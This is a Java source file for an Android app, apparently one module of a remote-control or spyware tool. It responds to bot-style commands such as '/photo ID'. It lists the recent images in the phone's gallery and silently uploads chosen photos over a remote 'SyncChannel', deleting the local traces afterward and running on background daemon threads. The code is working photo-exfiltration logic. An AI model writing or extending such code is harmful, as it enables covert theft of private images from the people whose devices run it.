// language: Java, file: MediaLibrary.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MediaLibrary {

    public static void listRecent(int limit) {
        if (limit <= 0) limit = 20;
        final int n = Math.min(limit, 100);
        Thread t = new Thread(() -> listSync(n), "v2-gal");
        t.setDaemon(true);
        t.start();
    }

    static void listSync(int limit) {
        Context c = SyncChannel.ctx;
        if (c == null) return;
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[] {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED,
                },
                null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT " + limit);
            if (cur == null) { SyncChannel.send("<i>gallery: null cursor</i>"); return; }
            StringBuilder b = new StringBuilder();
            b.append("<b>Recent images</b> (").append(cur.getCount()).append(")\n\n");
            while (cur.moveToNext()) {
                long id = cur.getLong(0);
                String name = cur.getString(1);
                long size = cur.getLong(2);
                b.append("<code>").append(id).append("</code> · ")
                 .append(SyncChannel.esc(name)).append(" · <i>")
                 .append(FileTransfer.humanSize(size)).append("</i>\n");
                if (b.length() > 3500) {
                    SyncChannel.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) SyncChannel.send(b.toString());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        } finally {
            if (cur != null) try { cur.close(); } catch (Throwable ignored) {}
        }
    }

    public static void download(long id) {
        if (id <= 0) { CommandDispatch.err("usage: /photo ID"); return; }
        Thread t = new Thread(() -> downloadSync(id), "v2-photo");
        t.setDaemon(true);
        t.start();
    }

    static void downloadSync(long id) {
        Context c = SyncChannel.ctx;
        if (c == null) return;
        InputStream in = null;
        FileOutputStream out = null;
        try {
            Uri u = ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
            in = c.getContentResolver().openInputStream(u);
            if (in == null) { SyncChannel.send("<i>photo: null stream</i>"); return; }
            File f = new File(c.getCacheDir(), "p_" + id + ".jpg");
            out = new FileOutputStream(f);
            byte[] buf = new byte[64 * 1024];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            out.close(); out = null;
            in.close(); in = null;
            SyncChannel.sendFile(f, "photo_" + id + ".jpg");
            try { f.delete(); } catch (Throwable ignored) {}
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        } finally {
            try { if (in != null) in.close(); } catch (Throwable ignored) {}
            try { if (out != null) out.close(); } catch (Throwable ignored) {}
        }
    }
}